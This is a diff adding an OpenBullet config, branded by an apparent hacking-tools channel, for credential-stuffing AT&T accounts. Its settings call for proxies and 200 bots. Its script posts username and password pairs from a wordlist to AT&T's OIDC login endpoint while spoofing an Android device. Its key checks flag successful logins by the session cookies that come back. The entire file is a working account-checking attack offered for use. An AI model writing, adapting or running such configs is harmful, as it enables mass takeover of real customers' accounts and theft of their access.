@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "AT&T(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-24T17:59:32.4042952+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Gu FUNCTION GenerateGUID -> VAR "GUID" 
+
+REQUEST POST "https://oidc.idp.clogin.att.com/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:passAuth&response_type=code+id_token+token&client_id=O5FoY1UsNnqOAb4ShkIIlZbfqkU=&redirect_uri=com.att.cso.haloc.mkapp://code&scope=openid+profile+email+address&state=QJT8RbymFk&response_mode=fragment&nonce=QJT8RbymFk" AutoRedirect=FALSE 
+  CONTENT "{\"userID\":\"<USER>\",\"password\":\"<PASS>\",\"eapToken\":\"\",\"mspToken\":\"\",\"deviceMake\":\"Xiaomi\",\"deviceModel\":\"Redmi 4\",\"deviceType\":\"PHONE\",\"deviceIdentifier\":\"<GUID>\",\"deviceOS\":\"Android\",\"deviceOSVersion\":\"29\",\"pushToken\":\"\",\"mkUUID\":\"unknown\",\"mkVersion\":\"1.0.055\",\"mkSDKVersion\":\"1.0.055\",\"mkLanguage\":\"EN\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; CIBA)" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: oidc.idp.clogin.att.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "login_required\"" 
+  KEYCHAIN Success OR 
+    KEY "error_description\":\"205.5" 
+    KEY "<COOKIES(*)>" Contains "AACJSESSIONID_231" 
+    KEY "<COOKIES(tAuthNState)>" Contains "true" 
+    KEY "<COOKIES(*)>" Contains "HT-SSO-Token" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
